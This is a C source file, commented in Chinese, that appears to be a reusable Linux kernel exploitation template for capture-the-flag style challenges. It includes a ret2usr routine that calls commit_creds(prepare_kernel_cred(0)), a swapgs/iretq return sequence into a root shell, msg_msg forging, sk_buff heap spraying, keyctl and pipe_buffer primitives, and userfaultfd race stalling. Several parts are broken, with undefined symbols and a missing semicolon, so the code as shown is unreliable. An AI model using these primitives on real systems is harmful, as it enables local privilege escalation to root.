#define _GNU_SOURCE

#include <asm/ldt.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/keyctl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <semaphore.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>


size_t kernel_base = 0xffffffff81000000, kernel_offset = 0;

void err_exit(char *msg) {
  printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
  exit(EXIT_FAILURE);
}

/*
 * 保存用户态数据
 */
uint64_t user_cs, user_ss, user_rflags, user_rsp;
void save_status() {
  asm("movq %%cs, %0;"
      "movq %%ss, %1;"
      "movq %%rsp, %3;"
      "pushfq;"
      "pop %2;"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
      :
      : "memory");
}

static void restore_status() {
  asm volatile("swapgs ;"
               "movq %0, 0x20(%%rsp)\t\n"
               "movq %1, 0x18(%%rsp)\t\n"
               "movq %2, 0x10(%%rsp)\t\n"
               "movq %3, 0x08(%%rsp)\t\n"
               "movq %4, 0x00(%%rsp)\t\n"
               "iretq"
               :
               : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs),
                 "r"(get_shell));
}

/*
 * 绑定cpu 0, 1...
 */
void bind_core(int core) {
  cpu_set_t cpu_set;

  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

  printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

/*
 * root 执行，从而获得权限
 */
void get_shell(void) {
  if (getuid()) {
    err_exit("\033[31m\033[1m[x] Failed to get the root!\033[0m");
  }

  puts("\033[32m\033[1m[+] Successful to get the root. \033[0m");
  puts("\033[34m\033[1m[*] Execve root shell now...\033[0m");

  system("/bin/sh");

  /* to exit the process normally, instead of segmentation fault */
  exit(0);
}

static void get_root_shell() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  if (!getuid()) {
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
  } else {
    err_exit("\033[31m\033[1m[x] Failed to get the root!\033[0m");
  }
  exit(0);
}

void rop() {
  size_t rop[0x10], i = 0;
  // swapgs --> iretq: rip, cs, rflags, rsp, ss. get_she;;
  rop[i++] = swapgs; // 后面还存在指令，需要查看到ret前的内容
  rop[i++] = 0;
  rop[i++] = iretq;
  rop[i++] = (size_t)get_shell; // rip
  rop[i++] = user_cs;
  rop[i++] = user_rflags;
  rop[i++] = user_rsp;
  rop[i++] = user_ss;
}

/*
 * ret2usr 的执行
 */
void ret2_usr(void) {
  char *(*pkc)(int) = (void *)(prepare_kernel_cred);
  void (*cc)(char *) = (void *)(commit_creds);
  (*cc)((*pkc)(0));
  restore_status();
}

/*
 * tty 结构体获取
 */
int get_tty_struct() {
  int ptmx_fd = open("/dev/ptmx", O_RDWR);
  if (ptmx_fd <= 0) {
    printf("[X] Ptmx open failed");
  }
  read(fd, tty_buf, 0);
  if (tty_buf[0] == 0x100005401) {
    err_exit("[-] tty read error");
  }
  return 0;
}

/*
 * seq_file
 * 0x0000000000000000 : xchg esp, eax ; ret ;
 * 0x0000000000000000 : xchg rsp, r15 ; ret ;
 * 0x0000000000000000 : xchg esp, r15d ; ret ;
 */
int seq_open() {
  int seq;
  if ((seq = open("/proc/self/stat", O_RDONLY)) == -1) {
    err_exit("[-] seq open fail");
  }
  return seq;
}

/*
 * msg_msg 相关
 */
struct list_head {
  uint64_t next;
  uint64_t prev;
};

struct msg_msg {
  struct list_head m_list;
  uint64_t m_type;
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
};

struct msg_msgseg {
  uint64_t next;
};

struct msgbuf {
  long mtype;
  char mtext[0];
};

// 调用msg_get 创建 msg_queue, 返回值为一个 msgqid
int make_queue(void) { return msgget(IPC_PRIVATE, 0666 | IPC_CREAT); }

// free 掉msg_msg
int recv_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}

// 创建msg_msg结构体,msgp => msgbuf 结构体，
// msgtyp: 消息类型 > 0 等于0 接收消息队列中最前面的那个消息， 由我们指定与接收
int send_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  ((struct msgbuf *)msgp)->mtype = msgtyp;
  return msgsnd(msqid, msgp, msgsz, 0);
}

// 设置flag, 不free
int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  return msgrcv(msqid, msgp, msgsz, msgtyp,
                MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

// 伪造一个msg_msg结构体
void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev,
               uint64_t m_type, uint64_t m_ts, uint64_t next,
               uint64_t security) {
  msg->m_list.next = m_list_next;
  msg->m_list.prev = m_list_prev;
  msg->m_type = m_type;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = security;
}

// 删除消息队列
void delete_queue(int msqid, int cmd, struct msqid_ds *buf) {
  if ((msgctl(msqid, cmd, buf)) == -1) {
    err_exit("[-] delete msg queue fail")
  }
}

/*
 * pipe 结构体
 */
int cmd_pipe_req[2], cmd_pipe_reply[2];
typedef struct pipe_buffer {
  uint64_t page;
  uint32_t offset, len;
  uint64_t ops;
  uint32_t flags;
  uint32_t padding;
  uint64_t private;
} pipe_buffer;

typedef struct pipe_buf_operations {
  uint64_t confirm;
  uint64_t release;
  uint64_t try_steal;
  uint64_t get;
} pipe_buf_operations;

// 创建pipe

/*
 * socket buffer: 堆喷射
 */
#define SOCKET_NUM 8
#define SK_BUFF_NUM 128

// 创建
int init_socket_array(int sk_socket[SOCKET_NUM][2]) {
  /* socket pairs to spray sk_buff */
  for (int i = 0; i < SOCKET_NUM; i++) {
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i]) < 0) {
      printf("[x] failed to create no.%d socket pair!\n", i);
      return -1;
    }
  }
  return 0;
}

// 喷射
int spray_sk_buff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size) {
  for (int i = 0; i < SOCKET_NUM; i++) {
    for (int j = 0; j < SK_BUFF_NUM; j++) {
      if (write(sk_socket[i][0], buf, size) < 0) {
        printf("[x] failed to spray %d sk_buff for %d socket!", j, i);
        return -1;
      }
    }
  }

  return 0;
}

//
int free_sk_buff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size) {
  for (int i = 0; i < SOCKET_NUM; i++) {
    for (int j = 0; j < SK_BUFF_NUM; j++) {
      if (read(sk_socket[i][1], buf, size) < 0) {
        puts("[x] failed to received sk_buff!");
        return -1;
      }
    }
  }

  return 0;
}

/*
 * shm_file_data
 */

/*
 * key
 */
int key_alloc(char *description, char *payload, size_t plen) {
  return syscall(__NR_add_key, "user", description, payload, plen,
                 KEY_SPEC_PROCESS_KEYRING);
}

int key_update(int keyid, char *payload, size_t plen) {
  return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
}

int key_read(int keyid, char *buffer, size_t buflen) {
  return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}

int key_revoke(int keyid) {
  return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}

int key_unlink(int keyid) {
  return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
}

/*
 * setxattr
 */

/*
 * userdefault fd 卡进程
 * @fault_page: mmap的一块区域
 */
void register_userdefault(void *fault_page, void *handler) {
  pthread_t thr;
  struct uffdio_api ua;
  struct uffdio_register ur;
  uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  ua.api = UFFD_API;
  ua.features = 0;
  if (ioctl(uffd, UFFDIO_API, &ua) == -1) {
    err_exit("[-] ioctl-UFFDIO_API");
  }

  ur.range.start = (unsigned long)fault_page; // 我们要监视的区域
  ur.range.len = PAGE_SIZE;
  ur.mode = UFFDIO_REGISTER_MODE_MISSING;
  if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) { // 注册缺页错误处理
    // 当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作
    err_exit("[-] ioctl-UFFDIO_REGISTER");
  }
  // 开一个线程，接收错误的信号，然后处理
  int s = pthread_create(&thr, NULL, handler, (void *)uffd);
  if (s != 0) {
    err_exit("[-] pthread_create");
  }
}

/*
 * fuse 卡进程
 */

/*
 * shm_file_data
 */
void create_shm_file_data() {
  int shmid;
  if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) {
    err_exit("shmget fail");
  }
  char *shm_addr = shmat(shmid, NULL, 0);
  if (shm_addr == (void *)-1) {
    err_exit("shmat fail");
  }
  if (shmdt(shm_addr) < 0) {
    err_exit("shmdt!");
  }
}